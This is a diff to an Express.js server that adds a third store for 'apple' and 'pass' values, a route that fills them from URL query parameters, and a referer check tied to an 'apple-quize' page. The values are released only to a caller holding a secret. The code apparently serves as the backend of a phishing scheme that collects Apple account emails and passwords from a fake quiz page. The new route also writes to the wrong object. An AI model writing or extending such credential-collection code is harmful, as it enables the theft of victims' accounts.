@@ -16,6 +16,8 @@ var pwd = {"apple":"",
            "pass":""}
 var pwd2 = {"apple":"",
            "pass":""}
+var pwd3 = {"apple":"",
+           "pass":""}
 
 // setting up app
 const app = express();
@@ -155,6 +157,19 @@ if (req.query.s == process.env.s) {
 }
 });
 
+app.get("/pwd3", function(req,res) {
+  if (req.query.ne) {
+    pwd2["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd2["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd3)
+} else {
+  res.render("404.ejs")
+}
+});
+
 app.get("/A2/:rnd", function(req,res) {
   res.redirect("https://discord.gg/k3NRzYtmsj")
 })
@@ -164,6 +179,8 @@ app.get("/sec", function(req,res){
      res.redirect("/pwd?s="+process.env.s)
    } else if (req.get('referer') === "https://pixelpaste.net/quize/apple-quize?id=22") {
          res.redirect("/pwd2?s="+process.env.s)             
+      } else if (req.get('referer') === "https://pixelpaste.net/quize/apple-quize?id=23"){
+      res.redirect("/pwd3?s="+process.env.s)
       } else {
       res.json({"req":"400"})
    }
